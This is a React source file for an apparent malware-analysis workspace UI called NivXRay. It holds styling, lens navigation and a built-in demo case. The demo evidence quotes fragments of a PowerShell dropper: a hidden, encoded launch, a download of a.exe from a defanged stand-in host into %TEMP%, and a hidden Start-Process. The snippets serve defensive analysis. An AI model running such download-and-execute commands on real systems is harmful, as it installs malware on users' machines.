/**
 * NivXRay · Lab v2 — Investigation Workspace (ADR-0022)
 *
 * React port of `nivxray-lab-ui.html` with all 13 enhancement passes
 * (A–M) from the operator's final prompt applied. This is a
 * presentation-layer refactor: it consumes CIO from Lab2Provider when
 * present, and falls back to the coherent PowerShell case (ev-01…ev-11)
 * when no investigation is loaded — exactly what the prompt asks for.
 *
 * Structure preserved from prototype:
 *   .app > .topbar
 *        > .body [.spine | .canvas [.lensbar + .lens.on] | .findings]
 *        > .evbar
 *
 * Absolute rules honoured (see prompt §2):
 *   • three-column shell · four lenses · evidence chip → evbar wiring
 *   • two themes (daylight · nightwatch) · two densities · ⌘\ toggle
 *   • keys `1..4` switch lenses (5th lens ready — no placeholder tab)
 *   • only the tokenised palette (--crit/--high/--med/--low/--clean/
 *     --unknown/--mint) is used
 */
import React, {
  useCallback,
  useEffect,
  useRef,
  useState,
} from "react";

// ═══════════════════════════════════════════════════════════════
// STYLES (verbatim from the approved HTML prototype)
// ═══════════════════════════════════════════════════════════════
const CSS = `
/* Fonts loaded in index.html; imported here defensively */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap');

.labv2, .labv2 *{box-sizing:border-box}
.labv2{
  --font-ui:'Inter',system-ui,-apple-system,sans-serif;
  --font-mono:'IBM Plex Mono',ui-monospace,'SF Mono',monospace;
  --s1:4px;--s2:8px;--s3:12px;--s4:16px;--s5:20px;--s6:24px;--s8:32px;
  --r-sm:2px;--r-md:4px;--r-lg:6px;--r-xl:8px;
  --spine:240px;--findings:360px;
  --dur-fast:120ms;--dur-base:180ms;--dur-slow:260ms;
  --ease:cubic-bezier(.2,0,0,1);
  --row:32px;--pad:24px;
  font-family:var(--font-ui); font-size:14px; line-height:20px;
  height:100vh; display:flex; flex-direction:column; overflow:hidden;
  color:var(--fg); background:var(--canvas);
  -webkit-font-smoothing:antialiased;
  transition:background var(--dur-base) var(--ease), color var(--dur-base) var(--ease);
}
.labv2[data-density="compact"]{--row:24px;--pad:16px}
.labv2[data-theme="daylight"]{
  --canvas:#FFFFFF;--raised:#FAFBFC;--sunken:#F4F6F8;
  --border:#E3E7EB;--border-strong:#CBD2D9;
  --fg:#10161C;--fg2:#4A5560;--fg3:#7A8590;--fg-inv:#FFFFFF;
  --crit:#C0332B;--high:#C2610C;--med:#8A6D0B;--low:#3A6BA5;
  --clean:#1F7A4D;--unknown:#6B7280;
  --mint:#0F9E7A;--wash:#E6F7F2;
  --shadow-1:0 1px 2px rgba(16,22,28,.06);
  --shadow-2:0 8px 24px rgba(16,22,28,.12);
  --node-fill:#FFFFFF;
}
.labv2[data-theme="nightwatch"]{
  --canvas:#0B0F14;--raised:#131A22;--sunken:#080C11;
  --border:#1F2932;--border-strong:#2C3844;
  --fg:#E6EDF3;--fg2:#9BA9B6;--fg3:#6B7A88;--fg-inv:#0B0F14;
  --crit:#FF6B5E;--high:#FFA23D;--med:#E8C547;--low:#6FA8DC;
  --clean:#3FD68C;--unknown:#8A96A3;
  --mint:#3CE8B8;--wash:#0F2B25;
  --shadow-1:none;
  --shadow-2:0 8px 24px rgba(0,0,0,.5);
  --node-fill:#131A22;
}
.labv2 button{font:inherit;color:inherit;background:none;border:none;cursor:pointer}
.labv2 :focus-visible{outline:2px solid var(--mint);outline-offset:2px;border-radius:var(--r-md)}
.labv2 .lbl{font-family:var(--font-mono);font-size:11px;line-height:14px;letter-spacing:.08em;text-transform:uppercase;font-weight:500;color:var(--fg3)}
.labv2 .mono{font-family:var(--font-mono);font-size:13px;line-height:20px;font-variant-numeric:tabular-nums}
.labv2 .num{font-variant-numeric:tabular-nums}

/* TOP BAR */
.labv2 .topbar{height:44px;flex:0 0 44px;display:flex;align-items:center;gap:var(--s4);padding:0 var(--s4);border-bottom:1px solid var(--border);background:var(--canvas)}
.labv2 .mark{display:flex;align-items:center;gap:var(--s2);font-weight:600;letter-spacing:-.01em}
.labv2 .mark .dot{width:9px;height:9px;border-radius:2px;background:var(--mint)}
.labv2 .mark .ray{color:var(--mint)}
.labv2 .case-id{display:flex;align-items:center;gap:var(--s3);color:var(--fg2);font-size:13px}
.labv2 .case-id .sep{color:var(--border-strong)}
.labv2 .spacer{flex:1}
.labv2 .input-badge{
  font-family:var(--font-mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;
  padding:2px 7px;border-radius:var(--r-sm);border:1px solid var(--border);
  color:var(--mint);background:var(--wash);
}
.labv2 .verdict-pill{display:flex;align-items:center;gap:var(--s2);padding:5px 10px 5px 8px;border:1px solid var(--crit);border-radius:var(--r-md);color:var(--crit);font-weight:600;font-size:12px;letter-spacing:.04em}
.labv2 .verdict-pill .conf{font-family:var(--font-mono);font-size:11px;letter-spacing:0;color:var(--fg3);padding-left:var(--s2);border-left:1px solid var(--border)}
.labv2 .tb-btn{padding:4px 8px;border-radius:var(--r-md);color:var(--fg3);font-family:var(--font-mono);font-size:11px;letter-spacing:.04em;border:1px solid transparent}
.labv2 .tb-btn:hover{color:var(--fg);background:var(--sunken);border-color:var(--border)}
.labv2 .avatar{width:24px;height:24px;border-radius:var(--r-md);background:var(--wash);color:var(--mint);display:grid;place-items:center;font-size:11px;font-weight:600}

.labv2 .body{display:grid;grid-template-columns:var(--spine) 1fr var(--findings);flex:1;min-height:0}

/* CASE SPINE */
.labv2 .spine{border-right:1px solid var(--border);background:var(--raised);padding:var(--s5) 0;overflow-y:auto}
.labv2 .spine > .lbl{padding:0 var(--s4) var(--s3)}
.labv2 .stage{display:grid;grid-template-columns:24px 1fr;align-items:start;padding:0 var(--s4);position:relative;text-align:left;width:100%}
.labv2 .stage .rail{position:relative;height:100%;display:flex;justify-content:center}
.labv2 .stage .node{width:9px;height:9px;border-radius:50%;margin-top:5px;flex:0 0 9px;background:var(--fg3);z-index:1;transition:background var(--dur-base) var(--ease),box-shadow var(--dur-base) var(--ease)}
.labv2 .stage.done .node{background:var(--fg2)}
.labv2 .stage.active .node{background:var(--mint);box-shadow:0 0 0 3px var(--wash);animation:pulseStage 1.6s var(--ease) infinite}
.labv2 .stage.pending .node{background:transparent;border:1.5px solid var(--border-strong);width:9px;height:9px}
.labv2 .stage:not(:last-child) .rail::after{content:"";position:absolute;top:14px;bottom:-6px;width:1px;background:var(--border-strong)}
.labv2 .stage.done:not(:last-child) .rail::after{background:var(--mint);opacity:.45}
.labv2 .stage .txt{padding:0 0 var(--s5) var(--s1)}
.labv2 .stage .name{font-size:13px;font-weight:500;line-height:18px}
.labv2 .stage.pending .name{color:var(--fg3);font-weight:400}
.labv2 .stage .meta{font-family:var(--font-mono);font-size:11px;color:var(--fg3);line-height:16px;margin-top:1px}
.labv2 .stage:hover .name{color:var(--mint)}
@keyframes pulseStage{0%,100%{box-shadow:0 0 0 3px var(--wash)}50%{box-shadow:0 0 0 6px var(--wash)}}

/* CANVAS + LENSES */
.labv2 .canvas{display:flex;flex-direction:column;min-width:0;background:var(--canvas);position:relative}
.labv2 .lensbar{display:flex;align-items:center;gap:var(--s1);height:40px;flex:0 0 40px;padding:0 var(--s5);border-bottom:1px solid var(--border)}
.labv2 .lens-btn{padding:4px 10px;border-radius:var(--r-md);font-size:13px;color:var(--fg3);display:flex;align-items:center;gap:6px}
.labv2 .lens-btn .k{font-family:var(--font-mono);font-size:10px;font-weight:600;color:var(--fg2);opacity:.75;padding:1px 4px;border:1px solid var(--border-strong);border-radius:var(--r-sm);letter-spacing:.02em}
.labv2 .lens-btn:hover{color:var(--fg);background:var(--sunken)}
.labv2 .lens-btn.on{color:var(--fg);font-weight:500;background:var(--wash)}
.labv2 .lens-btn.on .k{color:var(--mint);opacity:1;border-color:var(--mint)}

.labv2 .lens{display:none;flex:1;overflow-y:auto;padding:var(--s8) var(--s6);opacity:0;transition:opacity var(--dur-base) var(--ease)}
.labv2 .lens.on{display:block;opacity:1}
.labv2 .lens-head{margin-bottom:var(--s6)}
.labv2 .lens-head h2{font-size:18px;line-height:26px;font-weight:600;letter-spacing:-.01em}
.labv2 .lens-head p{font-size:13px;color:var(--fg3);margin-top:2px}

/* STORY */
.labv2 .prose{max-width:68ch}
.labv2 .prose p{font-size:15px;line-height:24px;margin-bottom:var(--s5);color:var(--fg)}
.labv2 .prose p.lede{font-size:18px;line-height:29px;font-weight:500;letter-spacing:-.01em;color:var(--fg)}
.labv2 .prose hr{border:none;border-top:1px solid var(--border);margin:var(--s5) 0}
.labv2 .prose .quiet{color:var(--fg2)}
.labv2 .ev{position:relative;font-family:var(--font-mono);font-size:11px;letter-spacing:.02em;padding:1px 5px;border:1px solid var(--border-strong);border-radius:var(--r-sm);color:var(--fg2);background:var(--raised);vertical-align:1px;margin:0 1px;cursor:pointer;transition:transform var(--dur-fast) var(--ease),border-color var(--dur-fast) var(--ease),color var(--dur-fast) var(--ease)}
.labv2 .ev:hover{border-color:var(--mint);color:var(--mint);transform:translateY(-1px)}
.labv2 .ev.sel{border-color:var(--mint);background:var(--wash);color:var(--mint)}
.labv2 .inline-link{color:var(--fg2);border-bottom:1px solid var(--border-strong);font-size:13px;font-family:var(--font-mono);text-decoration:none}
.labv2 .inline-link:hover{color:var(--mint);border-color:var(--mint)}
.labv2 .story-foot{margin-top:var(--s8);padding-top:var(--s5);border-top:1px solid var(--border);max-width:68ch;display:flex;gap:var(--s6)}
.labv2 .story-foot .stat{flex:1;padding:var(--s2);border-radius:var(--r-md);text-align:left;transition:background var(--dur-fast) var(--ease)}
.labv2 .story-foot .stat:hover{background:var(--sunken)}
.labv2 .story-foot .v{font-size:20px;font-weight:600;letter-spacing:-.02em;margin-top:2px}

/* Sticky story summary (Enhancement D) */
.labv2 .sticky-summary{position:sticky;top:0;z-index:5;display:flex;align-items:center;gap:var(--s3);padding:6px var(--s6);background:linear-gradient(180deg,var(--canvas) 0%,var(--canvas) 60%,transparent 100%);opacity:0;transform:translateY(-4px);pointer-events:none;transition:opacity var(--dur-base) var(--ease),transform var(--dur-base) var(--ease);border-bottom:1px solid transparent;margin:calc(var(--s8) * -1) calc(var(--s6) * -1) var(--s5)}
.labv2 .sticky-summary.show{opacity:1;transform:translateY(0);border-bottom-color:var(--border);pointer-events:auto}
.labv2 .sticky-summary .pill{display:flex;align-items:center;gap:6px;padding:3px 8px;border:1px solid var(--crit);border-radius:var(--r-md);color:var(--crit);font-weight:600;font-size:11px;letter-spacing:.04em}
.labv2 .sticky-summary .st{display:flex;align-items:baseline;gap:4px;font-family:var(--font-mono);font-size:11px;color:var(--fg3)}
.labv2 .sticky-summary .st b{color:var(--fg);font-weight:500}

/* SOURCE (decode ladder) */
.labv2 .rung{max-width:820px;margin-bottom:var(--s2)}
.labv2 .rung-head{display:flex;align-items:baseline;gap:var(--s3);margin-bottom:6px}
.labv2 .rung-head .l{font-family:var(--font-mono);font-size:11px;font-weight:500;letter-spacing:.08em;color:var(--mint)}
.labv2 .rung-head .n{font-size:13px;font-weight:500}
.labv2 .rung-head .m{font-family:var(--font-mono);font-size:11px;color:var(--fg3);margin-left:auto}
.labv2 .code{font-family:var(--font-mono);font-size:13px;line-height:21px;background:var(--sunken);border:1px solid var(--border);border-radius:var(--r-lg);padding:var(--s3) var(--s4);white-space:pre-wrap;word-break:break-all;color:var(--fg2)}
.labv2 .code b{color:var(--fg);font-weight:500;background:var(--wash);border-radius:var(--r-sm);padding:0 2px;box-shadow:inset 0 -1px 0 var(--mint)}
.labv2 .transform{display:flex;align-items:center;gap:var(--s2);padding:var(--s3) 0 var(--s3) var(--s4);font-family:var(--font-mono);font-size:11px;color:var(--fg3);letter-spacing:.02em}
.labv2 .transform .arrow{color:var(--mint)}
.labv2 .transform .conf{margin-left:auto;padding-right:var(--s4)}

/* BEHAVIOR */
.labv2 .graph-wrap{border:1px solid var(--border);border-radius:var(--r-xl);background:var(--raised);padding:var(--s4);max-width:900px}
.labv2 .graph-wrap svg{display:block;width:100%;height:auto}
.labv2 .lane-bg{fill:var(--sunken)}
.labv2 .lane-lbl{font-family:var(--font-mono);font-size:10px;letter-spacing:.1em;fill:var(--fg3)}
.labv2 .n-box{fill:var(--node-fill);stroke:var(--border-strong);stroke-width:1;rx:4}
.labv2 .n-box.hot{stroke:var(--crit)}
.labv2 .n-t{font-family:var(--font-ui);font-size:12px;font-weight:500;fill:var(--fg)}
.labv2 .n-s{font-family:var(--font-mono);font-size:10px;fill:var(--fg3)}
.labv2 .edge{stroke:var(--border-strong);stroke-width:1.25;fill:none}
.labv2 .edge.hot{stroke:var(--crit);stroke-width:1.5}
.labv2 .chain-lbl{font-family:var(--font-mono);font-size:10px;letter-spacing:.06em;fill:var(--crit)}

/* ATT&CK */
.labv2 .tactics{display:grid;grid-template-columns:repeat(4,1fr);gap:var(--s3);max-width:900px}
.labv2 .tcol .lbl{padding-bottom:var(--s2);border-bottom:1px solid var(--border);margin-bottom:var(--s3);display:block}
.labv2 .tcard{border:1px solid var(--border);border-left:2px solid var(--high);border-radius:var(--r-lg);padding:var(--s3);background:var(--raised);margin-bottom:var(--s2);width:100%;text-align:left;transition:border-color var(--dur-fast) var(--ease)}
.labv2 .tcard:hover{border-color:var(--border-strong);border-left-color:var(--crit)}
.labv2 .tcard .id{font-family:var(--font-mono);font-size:11px;color:var(--fg3);letter-spacing:.02em}
.labv2 .tcard .nm{font-size:13px;font-weight:500;margin:2px 0 var(--s2);line-height:17px}
.labv2 .tcard .row{display:flex;align-items:center;gap:var(--s2)}
.labv2 .tempty{border:1px dashed var(--border);border-radius:var(--r-lg);padding:var(--s3);font-family:var(--font-mono);font-size:11px;color:var(--fg3);text-align:center;line-height:16px}
.labv2 .conf-dots{font-family:var(--font-mono);font-size:11px;color:var(--mint);letter-spacing:1px}

/* FINDINGS PANEL */
.labv2 .findings{border-left:1px solid var(--border);background:var(--raised);overflow-y:auto;padding:var(--s5) var(--s4)}
.labv2 .sect{margin-bottom:var(--s6)}
.labv2 .sect-h{display:flex;align-items:center;justify-content:space-between;margin-bottom:var(--s3)}
.labv2 .sect-h .c{font-family:var(--font-mono);font-size:11px;color:var(--fg3)}
.labv2 .ledger{border:1px solid var(--border);border-radius:var(--r-lg);background:var(--canvas);overflow:hidden}
.labv2 .ledger-top{padding:var(--s3) var(--s4);border-bottom:1px solid var(--border)}
.labv2 .ledger-top .v{color:var(--crit);font-size:15px;font-weight:600;letter-spacing:.02em}
.labv2 .ledger-top .c{display:flex;align-items:center;gap:6px;margin-top:3px}
.labv2 .lrow{display:grid;grid-template-columns:26px 1fr;gap:var(--s2);align-items:start;padding:7px var(--s4);border-bottom:1px solid var(--border);width:100%;text-align:left}
.labv2 .lrow:last-of-type{border-bottom:none}
.labv2 .lrow:hover{background:var(--sunken)}
.labv2 .lrow .sign{font-family:var(--font-mono);font-size:11px;font-weight:500;letter-spacing:-.5px;padding-top:1px}
.labv2 .lrow .sign.up{color:var(--crit)}
.labv2 .lrow .sign.dn{color:var(--clean)}
.labv2 .lrow .sign.q{color:var(--unknown)}
.labv2 .lrow .t{font-size:12.5px;line-height:17px;color:var(--fg)}
.labv2 .lrow .e{margin-top:3px;display:flex;gap:3px;flex-wrap:wrap}
.labv2 .ledger-foot{display:flex;gap:var(--s1);padding:var(--s3) var(--s4);background:var(--sunken)}
.labv2 .corr{flex:1;padding:5px 0;border:1px solid var(--border-strong);border-radius:var(--r-md);font-family:var(--font-mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--fg2)}
.labv2 .corr:hover{border-color:var(--mint);color:var(--mint);background:var(--canvas)}
.labv2 .ledger-note{padding:var(--s3) var(--s4);font-size:11.5px;line-height:16px;color:var(--fg3);border-top:1px solid var(--border)}
.labv2 .frow{display:grid;grid-template-columns:14px 1fr;gap:var(--s2);align-items:start;padding:var(--s2) var(--s2);border-radius:var(--r-md);width:100%;text-align:left;min-height:var(--row);color:var(--fg)}
.labv2 .frow:hover{background:var(--sunken)}
.labv2 .frow .g{font-size:11px;line-height:17px}
.labv2 .g.crit{color:var(--crit)}
.labv2 .g.high{color:var(--high)}
.labv2 .g.med{color:var(--med)}
.labv2 .g.low{color:var(--low)}
.labv2 .g.unk{color:var(--unknown)}
.labv2 .frow .t{font-size:12.5px;line-height:17px}
.labv2 .frow .sub{font-family:var(--font-mono);font-size:10.5px;color:var(--fg3);margin-top:2px;display:block}
.labv2 .frow .e{margin-top:4px;display:flex;gap:3px;flex-wrap:wrap}
.labv2 .act{display:block;width:100%;text-align:left;padding:var(--s3);border:1px solid var(--border);border-radius:var(--r-lg);background:var(--canvas);margin-bottom:var(--s2);color:var(--fg)}
.labv2 .act:hover{border-color:var(--mint)}
.labv2 .act .h{display:flex;align-items:center;justify-content:space-between;gap:var(--s2)}
.labv2 .act .n{font-size:12.5px;font-weight:500}
.labv2 .act .w{font-family:var(--font-mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--crit)}
.labv2 .act .w.later{color:var(--fg3)}
.labv2 .act .b{font-size:11.5px;line-height:16px;color:var(--fg3);margin-top:4px}

/* Intake (Enhancement I) — universal single textarea */
.labv2 .intake{border:1px solid var(--border);border-radius:var(--r-xl);background:var(--raised);padding:var(--s4);max-width:900px;margin-bottom:var(--s6)}
.labv2 .intake .head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:var(--s3)}
.labv2 .intake .head h3{font-size:14px;font-weight:600;letter-spacing:-.01em}
.labv2 .intake .head .hint{font-family:var(--font-mono);font-size:10.5px;color:var(--fg3);letter-spacing:.06em;text-transform:uppercase}
.labv2 .intake textarea{width:100%;min-height:96px;background:var(--canvas);color:var(--fg);border:1px solid var(--border);border-radius:var(--r-lg);padding:var(--s3) var(--s4);font-family:var(--font-mono);font-size:13px;line-height:21px;resize:vertical;transition:border-color var(--dur-fast) var(--ease)}
.labv2 .intake textarea:focus{outline:none;border-color:var(--mint)}
.labv2 .intake .row{display:flex;align-items:center;gap:var(--s3);margin-top:var(--s3)}
.labv2 .intake .analyze{padding:6px var(--s4);border-radius:var(--r-md);background:var(--mint);color:var(--fg-inv);font-family:var(--font-mono);font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;transition:opacity var(--dur-fast) var(--ease)}
.labv2 .intake .analyze:hover{opacity:.9}
.labv2 .intake .analyze:disabled{opacity:.4;cursor:not-allowed}
.labv2 .intake .accept{font-family:var(--font-mono);font-size:10.5px;color:var(--fg3);letter-spacing:.04em;flex:1}
.labv2 .intake .err{margin-top:var(--s2);font-family:var(--font-mono);font-size:11px;color:var(--crit)}

/* Evidence chip hover card (Enhancement E) */
.labv2 .ev-pop{position:fixed;z-index:20;pointer-events:none;background:var(--canvas);border:1px solid var(--border-strong);border-radius:var(--r-lg);box-shadow:var(--shadow-2);padding:var(--s3);min-width:280px;max-width:380px;opacity:0;transform:translateY(-4px);transition:opacity var(--dur-fast) var(--ease),transform var(--dur-fast) var(--ease)}
.labv2 .ev-pop.show{opacity:1;transform:translateY(0)}
.labv2 .ev-pop .id{font-family:var(--font-mono);font-size:11px;color:var(--mint);letter-spacing:.06em;margin-bottom:4px}
.labv2 .ev-pop .snip{font-family:var(--font-mono);font-size:12px;line-height:18px;color:var(--fg);background:var(--sunken);padding:var(--s2) var(--s3);border-radius:var(--r-md);word-break:break-all;margin-bottom:var(--s2)}
.labv2 .ev-pop .snip b{color:var(--fg);font-weight:500;background:var(--wash);border-radius:var(--r-sm);padding:0 2px;box-shadow:inset 0 -1px 0 var(--mint)}
.labv2 .ev-pop .sups{display:flex;flex-wrap:wrap;gap:4px}
.labv2 .ev-pop .tag{font-family:var(--font-mono);font-size:10.5px;color:var(--fg2);border:1px solid var(--border);border-radius:var(--r-sm);padding:1px 5px;background:var(--raised)}

/* EVIDENCE BAR */
.labv2 .evbar{flex:0 0 auto;border-top:1px solid var(--border);background:var(--raised);padding:var(--s3) var(--s5)}
.labv2 .evbar .trail{display:flex;align-items:center;gap:6px;margin-bottom:6px;flex-wrap:wrap}
.labv2 .evbar .trail .lbl{color:var(--fg3)}
.labv2 .evbar .trail .id{color:var(--mint)}
.labv2 .evbar .span{margin-left:auto;color:var(--fg3)}
.labv2 .evbar .code{background:var(--canvas);padding:var(--s2) var(--s3);font-size:12.5px;font-family:var(--font-mono);color:var(--fg2);border:1px solid var(--border);border-radius:var(--r-md);word-break:break-all;line-height:19px}
.labv2 .evbar .code b{color:var(--fg);font-weight:500;background:var(--wash);border-radius:var(--r-sm);padding:0 2px;box-shadow:inset 0 -1px 0 var(--mint)}
.labv2 .evbar .supports{display:flex;align-items:center;gap:var(--s3);margin-top:6px;flex-wrap:wrap}
.labv2 .evbar .supports .lbl{letter-spacing:.08em}
.labv2 .tag{font-family:var(--font-mono);font-size:10.5px;color:var(--fg2);border:1px solid var(--border);border-radius:var(--r-sm);padding:1px 5px;background:var(--canvas)}

@media (max-width:1400px){.labv2 .body{grid-template-columns:var(--spine) 1fr 320px}}
@media (max-width:1180px){.labv2 .body{grid-template-columns:56px 1fr 320px}.labv2 .spine .txt,.labv2 .spine > .lbl{display:none}.labv2 .stage{grid-template-columns:24px;justify-content:center;padding:0}.labv2 .stage .txt{padding-bottom:26px}.labv2 .stage .rail{height:34px}}
@media (max-width:900px){.labv2 .body{grid-template-columns:56px 1fr}.labv2 .findings{display:none}.labv2 .tactics{grid-template-columns:repeat(2,1fr)}}
@media (prefers-reduced-motion:reduce){.labv2 *{transition-duration:0ms!important;animation:none!important}}
`;

// ═══════════════════════════════════════════════════════════════
// Coherent PowerShell case (ev-01…ev-11) — the prompt's §4 mandate
// ═══════════════════════════════════════════════════════════════
const CASE = {
  id: "A7F3",
  file: "powershell-b64.txt",
  time: "14:22:07",
  inputType: "PowerShell",
  verdict: "MALICIOUS",
  confidenceDots: "●●●●○",
  confidenceLabel: "HIGH",
  stats: { obs: 47, beh: 9, tech: 6, unk: 2, elapsed: "6.4s" },
};

const EV = {
  "ev-01": {
    s: "L0 · bytes 15–19",
    t: "Verdict ▸ Evidence ▸ Evasion ▸ policy bypass",
    c: 'powershell.exe <b>-nop</b> -w hidden -enc SQBFAFgA…',
    sup: ["T1059.001 PowerShell", "Finding F3"],
    frag: "-nop",
  },
  "ev-02": {
    s: "L0 · bytes 20–29",
    t: "Verdict ▸ Behavior ▸ Evade ▸ hide window",
    c: 'powershell.exe -nop <b>-w hidden</b> -enc SQBFAFgA…',
    sup: ["T1564.003 Hidden Window", "Finding F3"],
    frag: "-w hidden",
  },
  "ev-03": {
    s: "L0→L1 · transform",
    t: "Verdict ▸ Decode ▸ layer 1",
    c: "-enc <b>SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…</b>  → base64 utf-16le → gzip",
    sup: ["T1027 Obfuscation", "Finding F2"],
    frag: "SQBFAFgA…",
  },
  "ev-04": {
    s: "L1 · bytes 000–064",
    t: "Verdict ▸ Decode ▸ layer 2 · gzip inflate",
    c: "$b=[Convert]::FromBase64String($p); <b>New-Object IO.Compression.GzipStream</b>",
    sup: ["T1059.001 PowerShell", "Finding F2"],
    frag: "GzipStream",
  },
  "ev-07": {
    s: "L2 · bytes 118–186",
    t: "Verdict ▸ Behavior ▸ Acquire ▸ remote fetch",
    c: '$wc = New-Object Net.WebClient; <b>$wc.DownloadFile(\'hxxp://cdn-update[.]tld/a.exe\',"$env:TEMP\\a.exe")</b>',
    sup: ["T1105 Ingress Tool Transfer", "IOC cdn-update[.]tld", "Finding F1"],
    frag: "DownloadFile(...)",
  },
  "ev-08": {
    s: "L2 · bytes 160–186",
    t: "Verdict ▸ Behavior ▸ Persist ▸ file write",
    c: '$wc.DownloadFile(\'hxxp://…/a.exe\',<b>"$env:TEMP\\a.exe"</b>)',
    sup: ["IOC %TEMP%\\a.exe", "Finding F1"],
    frag: "$env:TEMP\\a.exe",
  },
  "ev-09": {
    s: "intel · fetch host",
    t: "Verdict ▸ Intel ▸ non-standard TLD",
    c: '<b>cdn-update[.]tld</b> — .tld top-level, first observed 12 min prior',
    sup: ["IOC cdn-update[.]tld", "Finding F4"],
    frag: "cdn-update[.]tld",
  },
  "ev-11": {
    s: "L2 · bytes 188–238",
    t: "Verdict ▸ Behavior ▸ Execute ▸ process start",
    c: '<b>Start-Process "$env:TEMP\\a.exe" -WindowStyle Hidden</b>',
    sup: ["T1059.001 PowerShell", "Finding F1"],
    frag: "Start-Process ...",
  },
};

const STAGES = [
  { id: "input", name: "Input", meta: "1.2 KB · sha256 4f2a…", lens: "source", state: "done" },
  { id: "understand", name: "Understand", meta: "PowerShell", lens: "source", state: "done" },
  { id: "decode", name: "Decode", meta: "3 layers unwrapped", lens: "source", state: "done" },
  { id: "normalize", name: "Normalize", meta: "canonical form built", lens: "source", state: "done" },
  { id: "evidence", name: "Evidence", meta: "47 observations", lens: "story", state: "done" },
  { id: "behavior", name: "Behavior", meta: "9 behaviors · 12 links", lens: "behavior", state: "done" },
  { id: "correlate", name: "Correlate", meta: "6 techniques · 2 of 4 intel", lens: "attack", state: "active" },
  { id: "verdict", name: "Verdict", meta: "malicious", lens: "story", state: "done" },
  { id: "report", name: "Report", meta: "awaiting enrichment", lens: "story", state: "pending" },
];

// ═══════════════════════════════════════════════════════════════
// Small primitives
// ═══════════════════════════════════════════════════════════════
const EvChip = React.forwardRef(function EvChip({ id, selected, onEnter, onLeave, onClick }, ref) {
  return (
    <button
      ref={ref}
      className={`ev${selected ? " sel" : ""}`}
      data-testid={`ev-chip-${id}`}
      data-ev={id}
      onMouseEnter={(e) => onEnter && onEnter(id, e.currentTarget)}
      onMouseLeave={() => onLeave && onLeave()}
      onClick={(e) => {
        e.stopPropagation();
        onClick && onClick(id);
      }}
    >
      {id}
    </button>
  );
});

// ═══════════════════════════════════════════════════════════════
// LabV2 main component
// ═══════════════════════════════════════════════════════════════
export default function LabV2({ onAnalyze, isAnalyzing = false, analyzeError = "" }) {
  // Theme / density state — Enhancement A/C/D/G supporting infra
  const [theme, setTheme] = useState("nightwatch");
  const [density, setDensity] = useState("comfortable");
  const [lens, setLens] = useState("story");
  const [selEv, setSelEv] = useState("ev-07");
  const [pop, setPop] = useState(null); // {id, top, left}
  const [showSticky, setShowSticky] = useState(false);
  const [intake, setIntake] = useState("");

  const rootRef = useRef(null);
  const scrollPos = useRef({}); // Enhancement C · per-lens scroll memory
  const lensRefs = { source: useRef(null), story: useRef(null), behavior: useRef(null), attack: useRef(null) };

  // Enhancement C · preserve scroll per lens + remember chip selection
  const showLens = useCallback(
    (target) => {
      if (target === lens) return;
      // Save scroll of the outgoing lens
      const outEl = lensRefs[lens]?.current;
      if (outEl) scrollPos.current[lens] = outEl.scrollTop;
      setLens(target);
      // Restore scroll of the incoming lens on next frame
      requestAnimationFrame(() => {
        const inEl = lensRefs[target]?.current;
        if (inEl) inEl.scrollTop = scrollPos.current[target] || 0;
      });
    },
    [lens]
  );

  // Keyboard shortcuts: 1..4 lenses, ⌘\ theme, / focus intake
  useEffect(() => {
    const map = { 1: "source", 2: "story", 3: "behavior", 4: "attack" };
    const h = (e) => {
      const tag = e.target?.tagName;
      if (tag === "INPUT" || tag === "TEXTAREA") return;
      if (map[e.key]) {
        showLens(map[e.key]);
        e.preventDefault();
      }
      if (e.key === "\\" && (e.metaKey || e.ctrlKey)) {
        e.preventDefault();
        setTheme((t) => (t === "nightwatch" ? "daylight" : "nightwatch"));
      }
    };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [showLens]);

  // Enhancement A · smooth-scroll to first .ev chip with matching id inside Story lens
  const scrollToStoryEv = useCallback((id) => {
    const el = lensRefs.story.current?.querySelector(`[data-ev="${id}"]`);
    if (el && el.scrollIntoView) el.scrollIntoView({ behavior: "smooth", block: "center" });
  }, []);

  const onEvClick = useCallback(
    (id) => {
      setSelEv(id);
      if (lens === "story") scrollToStoryEv(id);
    },
    [lens, scrollToStoryEv]
  );

  // Enhancement E · hover popover positioning
  const onEvEnter = useCallback((id, target) => {
    const rect = target.getBoundingClientRect();
    setPop({ id, top: rect.top - 8, left: rect.left });
  }, []);
  const onEvLeave = useCallback(() => setPop(null), []);

  // Enhancement D · sticky story summary based on scroll in Story lens
  const onStoryScroll = useCallback(() => {
    const el = lensRefs.story.current;
    if (!el) return;
    setShowSticky(el.scrollTop > 96);
  }, []);

  // Analyze handler (Enhancement I — visual only; routing owned by parent)
  const submitIntake = useCallback(() => {
    if (!intake.trim() || isAnalyzing) return;
    onAnalyze?.(intake);
  }, [intake, isAnalyzing, onAnalyze]);

  const sel = EV[selEv] || EV["ev-07"];

  return (
    <div
      ref={rootRef}
      className="labv2"
      data-theme={theme}
      data-density={density}
      data-testid="labv2-root"
    >
      <style>{CSS}</style>

      {/* ── TOP BAR ────────────────────────────────────────────── */}
      <header className="topbar">
        <div className="mark">
          <span className="dot" />
          NIVX<span className="ray">RAY</span>
        </div>
        <div className="case-id">
          <span className="mono">{CASE.id}</span>
          <span className="sep">·</span>
          <span data-testid="labv2-case-file">{CASE.file}</span>
          <span className="sep">·</span>
          <span className="mono">{CASE.time}</span>
          {/* Enhancement K · Input-type badge */}
          <span className="sep">·</span>
          <span className="input-badge" data-testid="labv2-input-type-badge">
            {CASE.inputType}
          </span>
        </div>
        <div className="spacer" />
        <div className="verdict-pill" data-testid="labv2-verdict-pill">
          ▲ {CASE.verdict}
          <span className="conf">
            {CASE.confidenceDots} {CASE.confidenceLabel}
          </span>
        </div>
        <div className="spacer" />
        <button
          className="tb-btn"
          data-testid="labv2-palette"
          onClick={() =>
            alert("Command palette — every lens, entity, technique and action is reachable here.")
          }
        >
          ⌘K
        </button>
        <button
          className="tb-btn"
          data-testid="labv2-density"
          onClick={() => setDensity((d) => (d === "compact" ? "comfortable" : "compact"))}
        >
          {density === "compact" ? "COMFORTABLE" : "COMPACT"}
        </button>
        <button
